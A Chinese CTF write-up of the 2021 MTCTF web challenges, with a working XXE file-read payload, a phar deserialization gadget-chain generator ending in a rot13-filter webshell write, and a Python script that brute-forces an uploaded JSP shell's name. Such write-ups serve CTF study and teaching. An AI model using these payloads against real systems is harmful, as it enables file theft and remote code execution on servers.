# 2021-MTCTF-Web

## UpStorage

登录那里能xml注入读文件：

```xml
<?xml version="1.0" ?>
<!DOCTYPE feng [
<!ENTITY file SYSTEM  "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<user><username>&file;</username><password>feng1</password></user>
```



读一下login.php，upload.php，class.php：

```php
<?php

session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

include "class.php";

if (isset($_FILES["file"])) {

    $dst_path = 'upload/'.md5("test".$_SERVER['REMOTE_ADDR']);
    @mkdir($dst_path);
    file_put_contents($dst_path.'/index.html', 'Nothing!');

    $filename = $_FILES["file"]["name"];
    $file = new File();
    $basename = $file->get_file_name($filename);

    $fileext = $file->get_real_ext($_FILES["file"]["type"]);
    $dst_path = $dst_path."/".md5($basename).$fileext;
    $filezise = $file->get_file_size($filename);

    if (strlen($filename) < 70 && strlen($filename) !== 0) {

        move_uploaded_file($_FILES["file"]["tmp_name"], $dst_path);
        $response = array("success" => true, "message" => "File upload success", "filesize" => $filezise);
        Header("Content-type: application/json");
        echo json_encode($response);
    } else {
        $response = array("success" => false, "error" => "Invaild filename");
        Header("Content-type: application/json");
        echo json_encode($response);
    }
}
?>

```

```php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);
include "class.php";

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);

    $username = $creds->username;
    $password = $creds->password;

    $user = new User();

    if (strlen($username) < 20 && $user->verify_user($username, $password)) {

        $_SESSION['login'] = true;
        $_SESSION['address'] = $_SERVER['REMOTE_ADDR'];
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
        header('Content-Type: text/html; charset=utf-8');
        echo $result;
        die("<script>window.location.href='index.php';</script>");
    } else{
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
        header('Content-Type: text/html; charset=utf-8');
        die($result);
    }

}catch(Exception $e) {
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
    header('Content-Type: text/html; charset=utf-8');
    echo $result;
}

?>

```

```php
<?php


abstract class Users {

    public $db;

    abstract public function verify_user($username, $password);
    abstract public function check_user_exist($username);
    abstract public function add_user($username, $password);
    abstract protected function eval();

    public function test() {
        $this->eval();
    }
}


class User extends Users {

    public $db;
    private $func;
    protected $param;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function verify_user($username, $password) {
        if (!$this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function check_user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    protected function eval() {
        if (is_array($this->param)) {
            ($this->func)($this->param);
        } else {
            die("no!");
        }
    }
}


class Welcome{

    public $file;
    public $username;
    public $password;
    public $verify;
    public $greeting;
    public function __toString(){
        return $this->verify->verify_user($this->username,$this->password);
    }

    public function __wakeup(){
        $this->greeting = "Welcome ".$this->username.":)";
    }
}


class File {
    public $filename;
    public $fileext;
    public $basename;

    public function check_file_exist($filename) {
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function get_real_ext($minitype) {

        switch ($minitype) {
            case 'image/gif':
                $this->fileext = ".gif";
                return $this->fileext;
            case 'image/jpeg':
                $this->fileext = ".jpg";
                return $this->fileext;
            case 'image/png':
                $this->fileext = ".png";
                return $this->fileext;
            default:
                $this->fileext = ".gif";
                return $this->fileext;
        }
    }


    public function get_file_name($filename) {
        $pos = strrpos($filename, ".");
        if ($pos !== false) {
            $this->basename = substr($filename, 0, $pos);
            return $this->basename;
        }
    }

    public function __call($func, $params) {
        foreach($params as $param){
            if($this->check_file_exist($param)) {
                $this->filename->test();
            }
        }
    }

    public function get_file_size($filename) {
        $size = filesize($filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }
}


class Logs {

    public $log;

    public function log() {

        $log = $_GET['log'];
        if(preg_match("/rot13|base|toupper|encode|decode|convert|bzip2/i", $log)) {
            die("hack!");
        }
        file_put_contents($log,'<?php exit();'.$log);
    }
}

?>

```

很明显的phar触发反序列化了，关键在于上传的路径不知道：

```php
    $dst_path = 'upload/'.md5("test".$_SERVER['REMOTE_ADDR']);
```

本来是知道的，但是经过测试可以发现靶机那边可能还有apache的代理，导致了remote_addr没法知道。

但是login.php那里把它写在了session里面：

```php
        $_SESSION['login'] = true;
        $_SESSION['address'] = $_SERVER['REMOTE_ADDR'];
```

拿上面的xml读文件读一下session即可得到路径，session文件的位置经过测试是在`/var/lib/php/sessions/`。

反序列化不说了，很容易构造，生成phar：

```php
<?php



abstract class Users {

    public $db;

    abstract public function verify_user($username, $password);
    abstract public function check_user_exist($username);
    abstract public function add_user($username, $password);
    abstract protected function eval();

    public function test() {
        $this->eval();
    }
}


class User extends Users {

    public $db;
    private $func;
    protected $param;

    public function __construct() {
        global $db;
        //$this->db = $db;
        $this->func = "call_user_func";
        $this->param = ["Logs","log"];
    }
    public function verify_user($username, $password) {
        if (!$this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function check_user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }


    protected function eval() {
        if (is_array($this->param)) {
            //var_dump($this->param);
            ($this->func)($this->param);
        } else {
            die("no!");
        }
    }
}


class Welcome{

    public $file;
    public $username;
    public $password;
    public $verify;
    public $greeting;
    public function __construct(){
        $this->verify = new File();
        //$this->username = new Welcome();
        $this->password = "/etc/passwd";
    }
    public function __toString(){
        return $this->verify->verify_user($this->username,$this->password);
    }

    public function __wakeup(){
        $this->greeting = "Welcome ".$this->username.":)";
    }
}


class File {
    public $filename;
    public $fileext;
    public $basename;
    public function check_file_exist($filename) {
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }
    public function __construct(){
        $this->filename = new User();
    }
    public function __call($func, $params) {
        foreach($params as $param){
            if($this->check_file_exist($param)) {
                $this->filename->test();
            }
        }
    }
}


class Logs {

    public $log;

    public function log() {

        $log = $_GET['log'];
        if(preg_match("/rot13|base|toupper|encode|decode|convert|bzip2/i", $log)) {
            die("hack!");
        }
        var_dump($log);
        file_put_contents($log,'<?php exit();'.$log);
        exit();
    }
}

    $a = new Welcome();
    $a->username = new Welcome();
    $a->username->username = "/etc/passwd";




@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

然后后缀改成png后上传，然后触发phar即可反序列化，触发点不止一个，用xml的那个了：

```xml
<?xml version="1.0" ?>
<!DOCTYPE feng [
<!ENTITY file SYSTEM  "phar:///var/www/html/upload/9603c62adf13a9213ea31b712d5c320f/0cc175b9c0f1b6a831c399e269772661.png">
]>
<user><username>&file;</username><password>feng1</password></user>
```

然后就是最后的log传参：

```php
        $log = $_GET['log'];
        if(preg_match("/rot13|base|toupper|encode|decode|convert|bzip2/i", $log)) {
            die("hack!");
        }
        file_put_contents($log,'<?php exit();'.$log);
        exit();
```

出套娃题的能不能给老子爬啊，有意思吗？？？

```
?log=php://filter/write=string.%7%32ot13|<?=flfgrz($_TRG[0]);?>|/resource=feng.php
```

然后`/readflag`即可。





## HackMe

比赛的时候跑不出来比赛结束跑出来了，真nm离谱。而且本身这题目就是很烂。

上传jsp绕过然后访问，是个时间戳，得爆破，但是测试一下就知道Java里面的时间戳默认是12小时的：

![image-20211211213611089](2021-MTCTF-Web.assets/image-20211211213611089.png)

然后upload不能访问，得拿?file来访问，然后爆破就行了，jsp拿L3H的那个：

```python
import requests
import time


def get_time_stamp():
    ct = time.time()
    local_time = time.localtime(ct)
    data_head = time.strftime("2021121109%M%S", local_time)
    #data_head = time.strftime("%Y%m%d%H%M%S", local_time)
    data_secs = (ct - int(ct)) * 1000
    time_stamp = "%s%03d" % (data_head, data_secs)
    return time_stamp
url1="http://eci-2ze2ptl1d7s4x0e77xai.cloudeci1.ichunqiu.com:8888/UploadServlet"
url2="http://eci-2ze2ptl1d7s4x0e77xai.cloudeci1.ichunqiu.com:8888/page.jsp?file=upload/4e5b09b2149f7619cca155c8bd6d8ee5/{}"
#yyyyMMddhhmmssSSS
#20211211185636
#20211211070517777
#20211211193112059


files={
    "uploadFile":("1.jsp",open("encodeShell.jsp","rb"))
}




t1 = get_time_stamp()
r=requests.post(url=url1,files=files)
t2 = get_time_stamp()
s1 = int(t1[14:])
print(s1)
s2 = int(t2[14:])
print(s2)
for i in range(s1,s2+5):
    r=requests.get(url=url2.format(t1[:14]+str(i)))
    print(url2.format(t1[:14]+str(i)))
    if "Something went wrong" not in r.text:
        print(r.text)

```

## EasySQL